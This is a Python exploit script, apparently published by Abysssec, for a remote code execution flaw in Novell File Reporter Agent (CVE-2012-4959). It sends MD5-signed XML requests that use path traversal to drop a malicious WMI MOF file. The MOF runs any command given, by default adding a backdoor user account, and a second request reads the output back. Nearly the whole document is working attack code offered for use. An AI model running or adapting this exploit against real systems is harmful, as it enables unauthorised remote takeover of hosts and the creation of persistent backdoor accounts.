# wwww.abysssec.com
# Novell File Reporter Agent XML Parsing Remote Code Execution Vulnerability (0day)
# CVE-2012-4959
# @abysssec
# well just one more of our 0day got published after ~2 year
# here is info : https://community.rapid7.com/community/metasploit/blog/2012/11/16/nfr-agent-buffer-vulnerabilites-cve-2012-4959
# and here is our exploit
 
import httplib, md5, sys
 
def message_MD5(arg):
    v = "SRS" + arg + "SERVER"
    m = md5.new(v)
    return m.hexdigest()
 
def genMof(command="net user abysssec 123456 /add"):       
     
    vbs = ""
    vbs += "\"Set objShell = CreateObject(\\\"WScript.Shell\\\")\\n\"\n"
    vbs += "\"objShell.Run \\\"cmd.exe /C "
    vbs += command
    vbs += "\\\"\""
 
 
    mof = """
    #pragma namespace ("\\\\\\\\.\\\\root\\\\subscription")
    #pragma deleteclass("MyASEventConsumer", nofail)
    #pragma deleteinstance("__EventFilter.Name=\\\"EF\\\"", nofail)
    #pragma deleteinstance("ActiveScriptEventConsumer.Name=\\\"ASEC\\\"", nofail)
 
    class MyASEventConsumer
    {
        [key]string Name;
    };
 
    instance of ActiveScriptEventConsumer as $CONSUMER
    {
        CreatorSID = {1,2,0,0,0,0,0,5,32,0,0,0,32,2,0,0};
        Name = "ASEC";
        ScriptingEngine = "VBScript";   
        ScriptText =
    SCRIPT;
    };
 
    instance of __EventFilter as $FILTER
    {
        CreatorSID = {1,2,0,0,0,0,0,5,32,0,0,0,32,2,0,0};
        Name = "EF";
        Query = "SELECT * FROM __InstanceCreationEvent"
            " WHERE TargetInstance.__class = \\"MyASEventConsumer\\"";
        QueryLanguage = "WQL";
    };
 
    instance of __FilterToConsumerBinding as $BINDING
    {
        CreatorSID = {1,2,0,0,0,0,0,5,32,0,0,0,32,2,0,0};
        Filter = $FILTER;
        Consumer = $CONSUMER;
    };
 
    instance of MyASEventConsumer
    {
         Name = "Trigger";
    };
    """.replace('SCRIPT',vbs)
 
    return mof
 
def main(argv=None):
    if argv is None:
        argv = sys.argv
     
    if len(argv) != 2:
        print "[!] USAGE : mof \"<command]>\""
        return
     
    msg = "<ROOT><NAME>FSFUI</NAME><UICMD>130</UICMD><TOKEN><FILE>../../../../../../Windows/system32/wbem/mof/command.mof</FILE></TOKEN><![CDATA["
    msg += genMof(argv[1] + "> C:/Windows/System32/info.dat")
    msg += "]]></ROOT>"
    body = message_MD5(msg).upper() + msg
    headers = {"Content-type": "text/xml"}
     
    conn = httplib.HTTPSConnection("192.168.10.20:3037")           
    conn.request("POST", "/SRS/CMD",body, headers)
    response = conn.getresponse()
    print "\n...Command Executed ..."
    print response.status, response.reason
     
    print response.read()
     
    msg = "<ROOT><NAME>FSFUI</NAME><UICMD>126</UICMD><TOKEN><FILE>../../../../../../WINDOWS/system32/info.dat</FILE></TOKEN></ROOT>"
    body = message_MD5(msg).upper() + msg
    conn.request("POST", "/SRS/CMD",body, headers)
    response = conn.getresponse()
    conn.request("POST", "/SRS/CMD",body, headers)
    response = conn.getresponse()
    print "\n...Getting result ..."
    print response.status, response.reason 
    print response.read()
     
     
    conn.close()
 
 
if __name__ == "__main__":
    main()
